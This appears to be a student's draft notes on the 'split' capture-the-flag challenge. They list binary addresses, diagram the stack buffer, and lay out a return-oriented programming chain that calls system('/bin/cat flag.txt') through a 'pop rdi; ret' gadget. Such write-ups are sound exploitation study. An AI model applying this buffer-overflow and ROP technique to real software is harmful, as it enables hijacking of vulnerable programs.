# Split

useful function is at 0x00400742
system call is that plus 9, aka 0x0040074b

do rop gadget before jumping here to load "/bin/cat flag.txt" (at 0x00601060) into edi

pwnme:

|-------0x8-------|  -   ret addr
|-------0x8-------|  -   RBP
|-------0x8-------|  -
|-------0x8-------|  |   local buffer
|-------0x8-------|  |
|-------0x8-------|  -


User input is 0x60 max

ROP chain:

|-------0x8-------|  -   system call at 0x0040074b
|-------0x8-------|  -   what will be in edi: 0x00601060 "/bin/cat flag.txt"
|-------0x8-------|  -   ret addr = 0x00000000004007c3: pop rdi; ret;
|-------0x8-------|  -   !!!DELETEstack alignment: 0x000000000040053e: ret;
|-------0x8-------|  -   FILLER (but we no longer have RBP)
|-------0x8-------|  -
|-------0x8-------|  |   FILLER
|-------0x8-------|  |
|-------0x8-------|  -
